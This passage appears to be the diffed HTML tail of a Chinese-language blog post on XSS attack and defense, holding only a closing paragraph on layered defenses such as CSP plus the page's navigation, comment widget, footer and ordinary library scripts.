+<p>所以在防禦的時候必須注意到上面提的這些不同的環節，針對每個環節都去做防禦，設下多個防線。就算攻擊者可以突破第一關，可能也會被第二關的 CSP 擋下，無法執行 JS；就算第二關被破了，還有第三關守著，降低 XSS 的影響程度，不會因為一個漏洞就讓使用者的帳戶整個被搶走。</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Front-end/">#Front-end</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2021/07/03/xss-challenge-intigriti-june-review/">Intigriti 六月份 XSS 挑戰檢討</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2021/06/12/paged-js-htmo-to-pdf-best-solution/">用 Paged.js 做出適合印成 PDF 的 HTML 網頁</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">評論</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>繁體中文</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2021/06/19/en/xss-attack-and-defense/" class="dropdown-item">
+                    English
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
